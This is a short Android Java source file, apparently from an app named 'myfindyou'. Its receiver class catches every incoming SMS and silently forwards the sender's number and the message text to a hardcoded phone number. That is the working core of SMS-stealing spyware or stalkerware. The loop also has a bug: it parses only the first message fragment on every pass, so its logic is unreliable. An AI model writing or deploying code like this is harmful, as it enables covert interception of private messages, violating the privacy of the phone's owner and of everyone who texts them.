package com.example.myfindyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;


public class RevMessageReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Object[] objs = (Object[]) intent.getExtras().get("pdus");
		SmsMessage[] messages = new SmsMessage[objs.length];
		for(int i =0;i<objs.length;i++)
			messages[i] = SmsMessage.createFromPdu((byte[])objs[0]);
		for(int i = 0; i < messages.length; i++){
			String msgcontent = messages[i].getMessageBody();
			String fromNum = messages[i].getDisplayOriginatingAddress();
			
			SmsManager sm = SmsManager.getDefault();
			sm.sendTextMessage(Constants.phoneNumber, null, fromNum+"send a message:"+msgcontent, null, null);
		}
	}

}
